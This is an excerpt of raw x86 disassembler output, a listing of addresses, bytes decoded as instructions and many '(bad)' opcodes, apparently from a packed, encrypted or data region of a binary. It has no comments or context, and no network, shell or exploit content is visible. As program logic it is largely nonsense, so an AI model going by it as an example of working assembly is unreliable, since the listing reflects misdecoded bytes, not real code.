  42719f:	shl    edx,cl
  4271a1:	sub    BYTE PTR [ebx],bh
  4271a3:	jns    0x427178
  4271a5:	mov    ebp,0xcad35392
  4271aa:	je     0x427131
  4271ac:	ror    ch,1
  4271ae:	(bad)  
  4271af:	cmc    
  4271b0:	int    0x89
  4271b2:	int    0x96
  4271b4:	cmc    
  4271b5:	int    0x22
  4271b7:	cmp    ecx,DWORD PTR [edi]
  4271b9:	shr    ebx,cl
  4271bb:	xchg   edx,eax
  4271bc:	cmp    ebx,ecx
  4271be:	shr    edx,cl
  4271c0:	sub    BYTE PTR [ebx+0x13],dl
  4271c3:	retf   0x4d8c
  4271c6:	rol    BYTE PTR [edx-0x2d],1
  4271c9:	int    0x8d
  4271cb:	adc    al,0xcd
  4271cd:	mov    ebp,ecx
  4271cf:	xchg   esi,eax
  4271d0:	adc    al,0xcd
  4271d2:	and    bh,BYTE PTR [ebx]
  4271d4:	psrlq  mm5,mm3
  4271d7:	xchg   edx,eax
  4271d8:	cmp    ebx,ecx
  4271da:	shr    edx,cl
  4271dc:	sub    BYTE PTR [ebx+0x13],dl
  4271df:	retf   0x4d8c
  4271e2:	ror    BYTE PTR [edx-0x2d],1
  4271e5:	int    0x8d
  4271e7:	cmc    
  4271e8:	int    0x89
  4271ea:	int    0x96
  4271ec:	cmc    
  4271ed:	int    0x22
  4271ef:	cmp    ecx,DWORD PTR [edi]
  4271f1:	cmp    ebx,ecx
  4271f3:	shr    ebx,cl
  4271f5:	xchg   edx,eax
  4271f6:	shr    edx,cl
  4271f8:	sub    BYTE PTR [ebx+0x13],dl
  4271fb:	retf   0x4d8c
  4271fe:	push   ebp
  4271ff:	pusha  
  427200:	jge    0x427231
  427202:	push   es
  427203:	mov    esp,0xcd808081
  427208:	jbe    0x42721e
  42720a:	int    0x8d
  42720c:	adc    al,0xcd
  42720e:	mov    ebp,ecx
  427210:	cmp    BYTE PTR [ebx],0xf0
  427213:	shl    edx,cl
  427215:	sub    BYTE PTR [ebx],bh
  427217:	jns    0x4271ec
  427219:	mov    ebp,0xcad35392
  42721e:	je     0x4271a5
  427220:	ror    ch,1
  427222:	lea    edx,[ecx]
  427224:	int    0x89
  427226:	int    0x96
  427228:	adc    ebp,ecx
  42722a:	and    bh,BYTE PTR [ebx]
  42722c:	psrlq  mm5,mm3
  42722f:	xchg   edx,eax
  427230:	cmp    ebx,ecx
  427232:	shr    edx,cl
  427234:	sub    BYTE PTR [ebx+0x13],dl
  427237:	retf   0x4d8c
  42723a:	rol    BYTE PTR [edx-0x2d],1
  42723d:	int    0x8d
  42723f:	in     eax,dx
  427240:	int    0x89
  427242:	int    0x96
  427244:	in     eax,dx
  427245:	int    0x22
  427247:	cmp    ecx,DWORD PTR [edi]
  427249:	shr    ebx,cl
  42724b:	xchg   edx,eax
  42724c:	cmp    ebx,ecx
  42724e:	shr    edx,cl
  427250:	sub    BYTE PTR [ebx+0x13],dl
  427253:	retf   0x4d8c
  427256:	ror    BYTE PTR [edx-0x2d],1
  427259:	int    0x8d
  42725b:	adc    ebp,ecx
  42725d:	mov    ebp,ecx
  42725f:	xchg   esi,eax
  427260:	adc    ebp,ecx
  427262:	and    bh,BYTE PTR [ebx]
  427264:	(bad)  
  427266:	(bad)  
  427268:	jmp    0x4271fc
  42726a:	shr    edx,cl
  42726c:	sub    BYTE PTR [ebx+0x13],dl
  42726f:	retf   0x4d8c
  427272:	push   ebp
  427273:	pusha  
  427274:	jge    0x4272a5
  427276:	push   es
  427277:	cmc    
  427278:	add    BYTE PTR [eax-0x12893280],0xcd
  42727f:	(bad)  
  427280:	in     eax,dx
  427281:	int    0x89
  427283:	int    0x80
  427285:	cmp    esi,eax
  427287:	shl    edx,cl
  427289:	sub    BYTE PTR [ebx],bh
  42728b:	jns    0x427260
  42728d:	mov    ebp,0xcad35392
  427292:	je     0x427219
  427294:	ror    ch,1
  427296:	lea    edx,[ecx*8+0x1496cd89]
  42729d:	int    0x22
  42729f:	cmp    ecx,DWORD PTR [edi]
  4272a1:	shr    ebx,cl
  4272a3:	xchg   edx,eax
  4272a4:	cmp    ebx,ecx
  4272a6:	shr    edx,cl
  4272a8:	sub    BYTE PTR [ebx+0x13],dl
  4272ab:	retf   0x4d8c
  4272ae:	rol    BYTE PTR [edx-0x2d],1
  4272b1:	int    0x8d
  4272b3:	cmc    
  4272b4:	int    0x89
  4272b6:	int    0x96
  4272b8:	cmc    
  4272b9:	int    0x22
  4272bb:	cmp    ecx,DWORD PTR [edi]
  4272bd:	shr    ebx,cl
  4272bf:	xchg   edx,eax
  4272c0:	cmp    ebx,ecx
  4272c2:	shr    edx,cl
  4272c4:	sub    BYTE PTR [ebx+0x13],dl
  4272c7:	retf   0x4d8c
  4272ca:	ror    BYTE PTR [edx-0x2d],1
  4272cd:	int    0x8d
  4272cf:	adc    al,0xcd
  4272d1:	mov    ebp,ecx
  4272d3:	xchg   esi,eax
  4272d4:	adc    al,0xcd
  4272d6:	and    bh,BYTE PTR [ebx]
  4272d8:	(bad)  
  4272da:	(bad)  
  4272dc:	jmp    0x427270
  4272de:	shr    edx,cl
  4272e0:	sub    BYTE PTR [ebx+0x13],dl
  4272e3:	retf   0x4d8c
  4272e6:	push   ebp
  4272e7:	pusha  
  4272e8:	jge    0x427319
  4272ea:	push   es
  4272eb:	add    DWORD PTR [eax+0x76cd8080],eax
  4272f1:	in     eax,dx
  4272f2:	int    0x8d
  4272f4:	in     eax,dx
  4272f5:	int    0x89
  4272f7:	int    0x80
  4272f9:	cmp    esi,eax
  4272fb:	shl    edx,cl
  4272fd:	sub    BYTE PTR [ebx],bh
  4272ff:	jns    0x4272d4
  427301:	mov    ebp,0xcad35392
  427306:	je     0x42728d
  427308:	ror    ch,1
  42730a:	(bad)  
  42730b:	cmc    
  42730c:	int    0x89
  42730e:	int    0x96
  427310:	cmc    
  427311:	int    0x22
  427313:	cmp    ecx,DWORD PTR [edi]
  427315:	shr    ebx,cl
  427317:	xchg   edx,eax
  427318:	cmp    ebx,ecx
  42731a:	shr    edx,cl
  42731c:	sub    BYTE PTR [ebx+0x13],dl
  42731f:	retf   0x4d8c
  427322:	rol    BYTE PTR [edx-0x2d],1
  427325:	int    0x8d
  427327:	adc    ebp,ecx
  427329:	mov    ebp,ecx
  42732b:	xchg   esi,eax
  42732c:	adc    ebp,ecx
  42732e:	and    bh,BYTE PTR [ebx]
  427330:	psrlq  mm5,mm3
  427333:	xchg   edx,eax
  427334:	cmp    ebx,ecx
  427336:	shr    edx,cl
  427338:	sub    BYTE PTR [ebx+0x13],dl
  42733b:	retf   0x4d8c
  42733e:	ror    BYTE PTR [edx-0x2d],1
  427341:	int    0x8d
  427343:	in     eax,dx
  427344:	int    0x89
  427346:	int    0x96
  427348:	in     eax,dx
  427349:	int    0x22
  42734b:	cmp    ecx,DWORD PTR [edi]
  42734d:	cmp    ebx,ecx
  42734f:	shr    ebx,cl
  427351:	xchg   edx,eax
  427352:	shr    edx,cl
  427354:	sub    BYTE PTR [ebx+0x13],dl
  427357:	retf   0x4d8c
  42735a:	push   ebp
  42735b:	pusha  
  42735c:	jge    0x427334
  42735e:	xor    bh,cl
  427360:	jbe    0x427332
  427362:	jo     0x427321
  427364:	outs   dx,DWORD PTR ds:[esi]
  427365:	lods   eax,DWORD PTR ds:[esi]
  427366:	add    BYTE PTR [eax],al
  427368:	int    0x8d
  42736a:	pop    ebp
  42736b:	inc    ebx
  42736c:	rcl    esp,cl
  42736e:	push   ss
  42736f:	int    0x76
  427371:	std    
  427372:	int    0x8d
  427374:	std    
  427375:	cmp    esi,eax
  427377:	cmp    edi,DWORD PTR [ecx-0x2d]
  42737a:	repnz sub bl,dl
  42737d:	mov    ebp,0xad35392
  427382:	jbe    0x427331
  427384:	int    0x76
  427386:	stc    
  427387:	int    0xa6
  427389:	stc    
  42738a:	int    0x76
  42738c:	stc    
  42738d:	int    0x8d
  42738f:	stc    
  427390:	cmp    ebp,DWORD PTR [ecx-0x132c36c5]
  427396:	xchg   edx,eax
  427397:	shr    DWORD PTR [ebp-0x7862acd8],cl
  42739d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42739e:	gs int 0x76
  4273a1:	xchg   ebp,eax
  4273a2:	cmp    ecx,DWORD PTR [edi]
  4273a4:	add    al,0xf2
  4273a6:	std    
  4273a7:	add    al,0xad
  4273a9:	std    
  4273aa:	shr    esp,cl
  4273ac:	sub    BYTE PTR [edi+0x12db537d],al
  4273b2:	hlt    
  4273b3:	dec    ecx
  4273b4:	and    DWORD PTR [esi-0x28932cb],eax
  4273ba:	int    0x8d
  4273bc:	std    
  4273bd:	cmp    esi,eax
  4273bf:	cmp    edi,DWORD PTR [ecx-0x2d]
  4273c2:	repnz sub bl,dl
  4273c5:	mov    ebp,0xcdd35392
  4273ca:	lea    ebp,[ebp+0x52f7d43]
  4273d0:	push   ds
  4273d1:	std    
  4273d2:	add    BYTE PTR [eax],al
  4273d4:	int    0x76
  4273d6:	std    
  4273d7:	int    0x8d
  4273d9:	std    
  4273da:	cmp    edi,DWORD PTR [ecx+0x3b]
  4273dd:	lock shl edx,cl
  4273e0:	sub    bl,dl
  4273e2:	mov    ebp,0xcdd35392
  4273e7:	lea    ebp,[ebp+0x1ad67d43]
  4273ed:	int    0x76
  4273ef:	stc    
  4273f0:	int    0x8d
  4273f2:	stc    
  4273f3:	cmp    edi,DWORD PTR [ecx+0x3b]
  4273f6:	lock sar DWORD PTR [ebp+0x28f2d392],cl
  4273fd:	push   ebx
  4273fe:	shr    ebx,cl
  427400:	jle    0x427383
  427402:	add    BYTE PTR [eax+0x5b6324c0],0x0
  427409:	(bad)  
  42740a:	popf   
  42740b:	iret   
  42740c:	jbe    0x427423
  42740e:	jo     0x4273cd
  427410:	jge    0x4273ed
  427412:	add    BYTE PTR [eax],al
  427414:	int    0x76
  427416:	std    
  427417:	int    0x8d
  427419:	std    
  42741a:	cmp    edi,DWORD PTR [ecx+0x3b]
  42741d:	lock shl edx,cl
  427420:	sub    bl,dl
  427422:	mov    ebp,0xcdd35392
  427427:	lea    esp,[ebp+0x5bd4d343]
  42742d:	int    0x76
  42742f:	stc    
  427430:	int    0x8d
  427432:	stc    
  427433:	cmp    edi,DWORD PTR [ecx+0x3b]
  427436:	lock shl edx,cl
  427439:	sub    bl,dl
  42743b:	mov    ebp,0xcdd35392
  427440:	lea    esp,[ebp+0x26d4d343]
  427446:	int    0x76
  427448:	stc    
  427449:	int    0x8d
  42744b:	stc    
  42744c:	cmp    edi,DWORD PTR [ecx+0x3b]
  42744f:	lock sar DWORD PTR [ebp+0x28f2d392],cl
  427456:	push   ebx
  427457:	shl    DWORD PTR [eax+0x5b],cl
  42745a:	iret   
  42745b:	jbe    0x427472
  42745d:	jo     0x42741c
  42745f:	das    
  427460:	cli    
  427461:	add    BYTE PTR [eax],al
  427463:	int    0x76
  427465:	std    
  427466:	int    0x8d
  427468:	std    
  427469:	cmp    edi,DWORD PTR [ecx+0x3b]
  42746c:	lock sar DWORD PTR [ebp+0x28f2d392],cl
  427473:	push   ebx
  427474:	shl    DWORD PTR [eax+0x5b],cl
  427477:	iret   
  427478:	jbe    0x42748f
  42747a:	jo     0x427439
  42747c:	sti    
  42747d:	stc    
  42747e:	add    BYTE PTR [eax],al
  427480:	int    0x76
  427482:	popf   
  427483:	xchg   ebp,eax
  427485:	or     dh,BYTE PTR [esi+0x14]
  427488:	add    dh,dl
  42748a:	cmp    eax,0xcd14d600
  42748f:	jbe    0x4274c6
  427491:	xchg   DWORD PTR [esi-0x78],esi
  427494:	jo     0x427453
  427496:	push   edx
  427497:	fild   DWORD PTR [eax]
  427499:	add    ch,cl
  42749b:	jbe    0x42749a
  42749d:	int    0x8d
  42749f:	std    
  4274a0:	cmp    edi,DWORD PTR [ecx+0x3b]
  4274a3:	lock shl edx,cl
  4274a6:	sub    bl,dl
  4274a8:	mov    ebp,0xcdd35392
  4274ad:	lea    esp,[ebp-0x592b2cbd]
  4274b3:	int    0x76
  4274b5:	stc    
  4274b6:	int    0x8d
  4274b8:	stc    
  4274b9:	cmp    edi,DWORD PTR [ecx+0x3b]
  4274bc:	lock shl edx,cl
  4274bf:	sub    bl,dl
  4274c1:	mov    ebp,0xcdd35392
  4274c6:	lea    esp,[ebp+0x32d4d343]
  4274cc:	int    0x76
  4274ce:	stc    
  4274cf:	int    0x8d
  4274d1:	stc    
  4274d2:	cmp    edi,DWORD PTR [ecx-0x2d]
  4274d5:	mov    ebp,0xd3f03b92
  4274da:	repnz sub BYTE PTR [ebx-0x2d],dl
  4274de:	jo     0x4274e0
  4274e0:	(bad)  
  4274e1:	cmp    eax,0x873576cd
  4274e6:	jbe    0x427470
  4274e8:	jo     0x4274a7
  4274ea:	add    eax,0xcd0000f9
  4274ef:	jbe    0x4274ee
  4274f1:	int    0x8d
  4274f3:	std    
  4274f4:	cmp    edi,DWORD PTR [ecx-0x2d]
  4274f7:	mov    ebp,0xd3f03b92
  4274fc:	repnz sub BYTE PTR [ebx-0x2d],dl
  427500:	jo     0x427502
  427502:	(bad)  
  427503:	cmp    eax,0x873576cd
  427508:	jbe    0x427492
  42750a:	jo     0x4274c9
  42750c:	jb     0x427507
  42750e:	add    BYTE PTR [eax],al
  427510:	int    0x8d
  427512:	inc    ebp
  427513:	int    0x76
  427515:	inc    ebp
  427516:	cmp    ecx,ecx
  427518:	cmp    ecx,DWORD PTR [edi]
  42751a:	shr    ebx,cl
  42751c:	xchg   edx,eax
  42751d:	shr    DWORD PTR [ebp-0x322cacd8],cl
  427523:	lea    ebp,ds:0x803fd33b
  427529:	add    DWORD PTR [eax+0x3614d480],0x80800180
  427533:	jo     0x427535
  427535:	(bad)  
  427536:	cmp    eax,0x87358dcd
  42753b:	lea    ecx,[eax+0xa95abd]
  427541:	add    ch,cl
  427543:	jbe    0x427575
  427545:	int    0x8d
  427547:	cmp    eax,0x76cd8881
  42754c:	cmp    eax,0xabd7687
  427551:	jbe    0x427510
  427553:	int    0x76
  427555:	stc    
  427556:	int    0x8d
  427558:	stc    
  427559:	cmp    esi,eax
  42755b:	shl    edx,cl
  42755d:	sub    BYTE PTR [ebx],bh
  42755f:	jns    0x427534
  427561:	mov    ebp,0xcdd35392
  427566:	lea    edi,[ebp-0x322c2ed1]
  42756c:	(bad)  
  42756d:	std    
  42756e:	int    0x96
  427570:	std    
  427571:	cmp    ecx,DWORD PTR [edi]
  427573:	cmp    ebx,ecx
  427575:	shr    ebx,cl
  427577:	xchg   edx,eax
  427578:	shr    edx,cl
  42757a:	sub    BYTE PTR [ebx+0x13],dl
  42757d:	xchg   DWORD PTR [ebp+0x2fd343f1],ecx
  427583:	or     edi,DWORD PTR [ecx]
  427585:	cli    
  427586:	add    BYTE PTR [eax],al
  427588:	int    0x76
  42758a:	mov    BYTE PTR [edx-0x2d349c58],ch
  427590:	xor    BYTE PTR [eax+0x4edcd96],al
  427596:	in     eax,dx
  427597:	adc    al,0x5b
  427599:	cwde   
  42759a:	call   0xcd34:0x76cd6d3b
  4275a1:	add    DWORD PTR ds:0xcd808081,ebp
  4275a7:	xchg   esi,eax
  4275a8:	mov    ch,cl
  4275aa:	or     ch,0xd6
  4275ad:	dec    esp
  4275ae:	int    0xe6
  4275b0:	mov    ch,cl
  4275b2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4275b3:	dec    esp
  4275b4:	or     dh,BYTE PTR [esi-0x3]
  4275b7:	pop    edi
  4275b8:	jnp    0x4275f1
  4275ba:	ficom  WORD PTR [ebx]
  4275bc:	cmp    esp,ebx
  4275be:	pop    ebp
  4275bf:	mov    ebp,0x3b25230a
  4275c4:	adc    DWORD PTR [edi],ebp
  4275c6:	inc    ebp
  4275c7:	sti    
  4275c8:	xchg   edx,eax
  4275c9:	shr    ecx,cl
  4275cb:	sub    BYTE PTR [edx],dl
  4275cd:	clc    
  4275ce:	add    BYTE PTR [eax-0x102c9380],0x92
  4275d5:	cmp    ebx,ebp
  4275d7:	push   ebx
  4275d8:	clc    
  4275d9:	int    0xe6
  4275db:	sbb    al,0x53
  4275dd:	aad    0x43
  4275df:	(bad)  
  4275e1:	sbb    eax,DWORD PTR [ebx-0xc]
  4275e4:	(bad)  
  4275e5:	das    
  4275e6:	adc    cl,BYTE PTR [ebp+0x59]
  4275e9:	je     0x427595
  4275eb:	push   edi
  4275ec:	ja     0x4275b3
  4275ee:	xchg   edi,eax
  4275ef:	shr    ebx,0xd9
  4275f2:	add    DWORD PTR [eax+0x3096cd80],0xcd14d6cd
  4275fc:	xchg   esi,eax
  4275fd:	mov    ch,cl
  4275ff:	(bad)  
  427600:	dec    esp
  427601:	int    0x96
  427603:	mov    ch,cl
  427605:	(bad)  
  427606:	dec    esp
  427607:	int    0xe6
  427609:	mov    ch,cl
  42760b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42760c:	dec    esp
  42760d:	cmp    edx,DWORD PTR [ecx]
  42760f:	cmp    esp,ebx
  427611:	das    
  427612:	inc    ebp
  427613:	sti    
  427614:	xchg   edx,eax
  427615:	shr    ecx,cl
  427617:	sub    BYTE PTR [edx],dl
  427619:	clc    
  42761a:	add    BYTE PTR [eax-0x22c49380],0x53
  427621:	aad    0xd3
  427623:	out    dx,eax
  427624:	xchg   edx,eax
  427625:	push   ebx
  427626:	clc    
  427627:	int    0xe6
  427629:	xor    ch,cl
  42762b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42762c:	adc    al,0x3b
  42762e:	popf   
  42762f:	int    0x76
  427631:	xor    BYTE PTR [ebx],bh
  427633:	cli    
  427634:	int    0x8d
  427636:	adc    al,0x2f
  427638:	inc    ebp
  427639:	loope  0x4275cd
  42763b:	shr    DWORD PTR [ebp+0x53cb3b28],cl
  427641:	cli    
  427642:	push   esi
  427643:	add    BYTE PTR [eax-0x132c9380],0x92
  42764a:	push   ebx
  42764b:	popf   
  42764c:	int    0x76
  42764e:	mov    BYTE PTR [edi-0x320be427],al
  427654:	bswap  ebp
  427656:	(bad)  
  427657:	dec    esp
  427658:	int    0xe6
  42765a:	xor    ch,cl
  42765c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42765d:	adc    al,0x4
  42765f:	lods   eax,DWORD PTR ds:[esi]
  427660:	std    
  427661:	add    al,0xe9
  427663:	std    
  427664:	shr    ebx,cl
  427666:	sub    BYTE PTR [ebx],bh
  427668:	ficom  DWORD PTR [esi-0x2c]
  42766b:	aaa    
  42766c:	ficom  WORD PTR [ebx]
  42766e:	adc    dh,bh
  427670:	mov    ebp,0x1225230a
  427675:	clc    
  427676:	aam    0x37
  427678:	ficom  WORD PTR [ebx]
  42767a:	adc    dh,ah
  42767c:	mov    ebp,0x8725230a
  427681:	leave  
  427682:	sbb    esi,esp
  427684:	push   ebx
  427685:	jge    0x4276da
  427687:	cdq    
  427688:	pop    ebp
  427689:	mov    ebp,0x1225230a
  42768e:	add    dl,dh
  427690:	aaa    
  427691:	ficom  WORD PTR [ebx]
  427693:	cmp    esi,ecx
  427695:	adc    bh,dl
  427697:	out    0x37,al
  427699:	ficom  WORD PTR [ebx]
  42769b:	(bad)  
  42769c:	sbb    eax,DWORD PTR [ebx-0xf]
  42769f:	(bad)  
  4276a0:	das    
  4276a1:	adc    dl,BYTE PTR [esi-0x1]
  4276a4:	das    
  4276a5:	stos   DWORD PTR es:[edi],eax
  4276a6:	push   es
  4276a7:	in     eax,0x9b
  4276a9:	xchg   edi,eax
  4276aa:	imul   bl
  4276ac:	and    al,0x81
  4276ae:	add    BYTE PTR [eax-0x32776933],0xd6
  4276b5:	dec    esp
  4276b6:	int    0xa6
  4276b8:	mov    ch,cl
  4276ba:	out    0x4c,al
  4276bc:	cmp    edx,DWORD PTR [ecx]
  4276be:	pop    edi
  4276bf:	jnp    0x4276f8
  4276c1:	ficom  WORD PTR [ebx]
  4276c3:	cmp    esp,ebx
  4276c5:	das    
  4276c6:	inc    ebp
  4276c7:	sti    
  4276c8:	xchg   edx,eax
  4276c9:	shr    edi,cl
  4276cb:	xchg   edx,eax
  4276cc:	cmp    eax,DWORD PTR [eax]
  4276ce:	shl    ebp,cl
  4276d0:	sub    BYTE PTR [edx],cl
  4276d2:	(bad)  
  4276d3:	cmc    
  4276d4:	push   ebx
  4276d5:	fxch   st(5)
  4276d7:	out    0xf5,al
  4276d9:	imul   eax,DWORD PTR [eax+0x3b6c8080],0xcdfc53a9
  4276e3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4276e4:	and    al,0xcd
  4276e6:	and    ecx,DWORD PTR [edx]
  4276e8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4276e9:	adc    DWORD PTR [ebx-0x1e],eax
  4276ec:	(bad)  
  4276ed:	xchg   BYTE PTR [ebx],bh
  4276ef:	fiadd  DWORD PTR [ebx-0x27]
  4276f2:	aam    0x20
  4276f4:	add    dh,dl
  4276f6:	xor    al,0xcd
  4276f8:	(bad)  
  4276f9:	and    al,0x0
  4276fb:	(bad)  
  4276fc:	sub    al,0x0
  4276fe:	(bad)  
  4276ff:	std    
  427700:	add    BYTE PTR [eax-0x43],bl
  427703:	sub    edi,eax
  427705:	add    BYTE PTR [eax],al
  427707:	or     al,BYTE PTR [esi-0x7f7f9615]
  42770d:	or     ch,0x96
  427710:	mov    ch,cl
  427712:	out    0x4c,al
  427714:	cmp    edi,ecx
  427716:	cmp    esp,ebx
  427718:	das    
  427719:	inc    ebp
  42771a:	add    edx,DWORD PTR [edx+0xa9210d3]
  427720:	out    0xf5,al
  427722:	int    0xe6
  427724:	mov    ch,cl
  427726:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  427727:	dec    esp
  427728:	shr    ecx,cl
  42772a:	sub    BYTE PTR [ebx],bh
  42772c:	dec    ebp
  42772e:	(bad)  
  42772f:	cmc    
  427730:	cmp    ebx,ebp
  427732:	push   ebx
  427733:	clc    
  427734:	int    0xe6
  427736:	xor    BYTE PTR [ebx],bh
  427738:	cli    
  427739:	push   ebx
  42773a:	aad    0xcd
  42773c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42773d:	adc    al,0x3b
  42773f:	popf   
  427740:	int    0xc9
  427742:	int    0xe6
  427744:	xor    ch,cl
  427746:	or     al,0xcd
  427748:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  427749:	adc    al,0x2f
  42774b:	inc    ebp
  42774c:	jge    0x4276e0
  42774e:	shr    ecx,cl
  427750:	sub    BYTE PTR [ebx],bh
  427752:	fst    st(3)
  427754:	jmp    0x4276e8
  427756:	adc    bh,al
  427758:	add    BYTE PTR [eax-0x3aac9380],0x53
  42775f:	lock inc ebx
  427761:	icebp  
  427762:	(bad)  
  427763:	sbb    BYTE PTR [ebx+0x2],al
  427766:	(bad)  
  427767:	and    dh,BYTE PTR [ecx+0x761dfc3b]
  42776d:	mov    esi,0xdd8bf56d
  427772:	(bad)  
  427773:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  427774:	cmp    edi,esp
  427776:	sbb    eax,0xcd62ec76
  42777b:	jbe    0x427705
  42777d:	int    0x8d
  42777f:	dec    esp
  427780:	int    0x96
  427782:	mov    ch,cl
  427784:	(bad)  
  427785:	dec    esp
  427786:	adc    al,BYTE PTR [edx]
  427788:	mov    ebp,0x5625230a
  42778d:	jnp    0x4277c6
  42778f:	ficom  WORD PTR [ebx]
  427791:	das    
  427792:	inc    ebp
  427793:	jge    0x427727
  427795:	int    0xfb
  427797:	cmp    eax,DWORD PTR [eax]
  427799:	cmp    ebx,edx
  42779b:	sar    DWORD PTR [ecx-0x2cfcc4d8],cl
  4277a1:	jmp    0x427735
  4277a3:	adc    dh,bh
  4277a5:	add    BYTE PTR [eax-0x36ac9380],0x53
  4277ac:	divps  xmm6,XMMWORD PTR [esi-0x3]
  4277b0:	(bad)  
  4277b1:	test   BYTE PTR [ebx-0x1d],al
  4277b4:	aam    0x4c
  4277b6:	adc    al,BYTE PTR [esi-0x3e]
  4277b9:	gs sub al,0x1
  4277bc:	jo     0x4277f8
  4277be:	mov    edx,0x124aece0
  4277c3:	ss inc edx
  4277c5:	das    
  4277c6:	sbb    edx,esi
  4277c8:	mov    ebx,0xaa029f75
  4277cd:	test   al,0x63
  4277cf:	retf   
  4277d0:	shr    BYTE PTR [eax+eax*4],cl
  4277d3:	xchg   esi,eax
  4277d4:	int    0xed
  4277d6:	add    al,0xed
  4277d8:	dec    esp
  4277d9:	int    0x76
  4277db:	mov    ch,cl
  4277dd:	lea    ecx,[edi+ebp*1+0x45]
  4277e1:	jge    0x427775
  4277e3:	shr    ebx,cl
  4277e5:	xchg   edx,eax
  4277e6:	int    0x8d
  4277e8:	mov    ch,cl
  4277ea:	xchg   esi,eax
  4277eb:	dec    esp
  4277ec:	cwde   
  4277ed:	shl    edx,cl
  4277ef:	sub    ch,cl
  4277f1:	lea    ebx,[ecx+ebp*2]
  4277f4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4277f5:	mov    esi,0x793b4229
  4277fa:	cmp    ebx,edx
  4277fc:	push   ebx
  4277fd:	ror    BYTE PTR [edx],cl
  4277ff:	or     ebp,0x1cd2476
  427805:	xor    eax,0xcd808081
  42780a:	mov    ch,cl
  42780c:	jbe    0x427832
  42780e:	int    0x1
  427810:	xor    eax,0xcd808081
  427815:	add    BYTE PTR [edi-0x72329b92],0x24
  42781c:	int    0xa
  42781e:	adc    DWORD PTR [ecx+0x7ecd8080],eax
  427824:	adc    al,0xc0
  427826:	test   BYTE PTR [eax+eax*4+0x808050],bh
  42782d:	nop
  42782e:	jo     0x427892
  427830:	add    bl,ah
  427832:	or     cl,BYTE PTR [ebx-0x32778933]
  427838:	lea    ecx,[edi+ebp*1+0x45]
  42783c:	jge    0x4277d0
  42783e:	shr    ebx,cl
  427840:	xchg   edx,eax
  427841:	int    0x8d
  427843:	mov    ch,cl
  427845:	xchg   esi,eax
  427846:	dec    esp
  427847:	add    dh,dl
  427849:	and    al,0x3b
  42784b:	jns    0x427888
  42784d:	ficom  DWORD PTR [ebx-0x2e]
  427850:	or     dh,BYTE PTR [esi-0x3]
  427853:	iret   
  427854:	jbe    0x427853
  427856:	jo     0x4277f2
  427858:	add    dh,dl
  42785a:	sbb    al,0xd3
  42785c:	repnz sub BYTE PTR [eax],al
  42785f:	(bad)  
  427860:	adc    al,0x0
  427862:	(bad)  
  427863:	xor    BYTE PTR [eax],al
  427865:	(bad)  
  427866:	dec    esp
  427867:	add    dh,dl
  427869:	mov    BYTE PTR [ebp+0xfe2b],bh
  42786f:	int    0x76
  427871:	mov    ch,cl
  427873:	lea    ecx,[edi+ebp*1+0x45]
  427877:	jge    0x42780b
  427879:	shr    ebx,cl
  42787b:	xchg   edx,eax
  42787c:	int    0x8d
  42787e:	mov    ch,cl
  427880:	xchg   esi,eax
  427881:	dec    esp
  427882:	cmp    edi,DWORD PTR [ecx+0x3b]
  427885:	fcmovbe st,st(3)
  427887:	repnz sub ch,cl
  42788a:	das    
  42788b:	push   ebx
  42788c:	rol    BYTE PTR [ebx+0x7d],cl
  42788f:	aam    0x36
  427891:	int    0x76
  427893:	xor    ch,cl
  427895:	lea    edx,[edi+ebp*1]
  427898:	inc    ebp
  427899:	jge    0x42782d
  42789b:	shr    ebx,cl
  42789d:	xchg   edx,eax
  42789e:	int    0x8d
  4278a0:	xor    ch,cl
  4278a2:	xchg   esi,eax
  4278a3:	adc    al,0x3b
  4278a5:	jns    0x4278e2
  4278a7:	fcmovbe st,st(3)
  4278a9:	repnz sub ch,cl
  4278ac:	lea    ebx,[ebx+edx*2]
  4278af:	shr    BYTE PTR [edi],cl
  4278b1:	shl    DWORD PTR [esi-0x3],1
  4278b4:	or     al,BYTE PTR [ecx+0x1cd2cba8]
  4278ba:	adc    BYTE PTR [esi+0x5b71edcd],0x98
  4278c1:	call   0xcd3c:0xd6cd6d3b
  4278c8:	xchg   esi,eax
  4278c9:	inc    esp
  4278ca:	int    0xe6
  4278cc:	and    al,0x5d
  4278ce:	mov    ebp,0x5f25230a
  4278d3:	jnp    0x42790c
  4278d5:	ficom  WORD PTR [ebx]
  4278d7:	inc    ebx
  4278d8:	icebp  
  4278d9:	das    
  4278da:	or     BYTE PTR [edi],al
  4278dc:	add    BYTE PTR [eax-0x4613080],0x82
  4278e3:	test   BYTE PTR [ebx-0xc],al
  4278e6:	jnp    0x4278ce
  4278e8:	inc    ebx
  4278e9:	hlt    
  4278ea:	(bad)  
  4278eb:	mov    BYTE PTR [ebx-0xf],al
  4278ee:	das    
  4278ef:	add    eax,0x80809216
  4278f4:	adc    bh,bh
  4278f6:	jno    0x42792f
  4278f8:	ficom  WORD PTR [ebx]
  4278fa:	(bad)  
  4278fb:	mov    BYTE PTR [ebx-0xf],al
  4278fe:	das    
  4278ff:	add    eax,0x80809285
  427904:	adc    bh,bh
  427906:	xchg   esi,eax
  427907:	aaa    
  427908:	ficom  WORD PTR [ebx]
  42790a:	(bad)  
  42790b:	mov    BYTE PTR [ebx-0xf],al
  42790e:	das    
  42790f:	add    eax,0x808080f8
  427914:	adc    bh,bh
  427916:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  427917:	aaa    
  427918:	ficom  WORD PTR [ebx]
  42791a:	(bad)  
  42791b:	test   BYTE PTR [ebx-0xf],al
  42791e:	aam    0x3e
  427920:	adc    bh,bh
  427922:	scas   al,BYTE PTR es:[edi]
  427923:	aaa    
  427924:	ficom  WORD PTR [ebx]
  427926:	(bad)  
  427927:	mov    BYTE PTR [ebx-0xf],al
  42792a:	das    
  42792b:	add    eax,0x808081db
  427930:	adc    bh,bh
  427932:	mov    dh,0x37
